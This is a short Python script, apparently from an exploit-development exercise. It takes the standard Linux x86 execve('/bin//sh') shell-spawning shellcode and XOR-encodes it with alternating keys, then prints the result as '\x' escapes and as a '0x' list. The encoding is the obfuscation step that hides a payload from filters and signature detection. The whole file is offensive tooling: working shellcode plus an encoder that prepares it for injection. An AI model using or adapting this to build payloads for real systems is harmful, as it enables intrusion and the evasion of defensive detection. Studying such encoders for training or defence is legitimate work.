shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

encoded = ""
encoded2 = ""

for idx, x in enumerate(shellcode):
    if idx%2 == 0:
        y = x ^ 0xaa
    else:
        y = x ^ 0xbb

    encoded += '\\x'
    encoded += '%02x' % (y & 0xff)

    encoded2 += '0x'
    encoded2 += '%02x,' %(y & 0xff)


print(encoded)

print(encoded2)
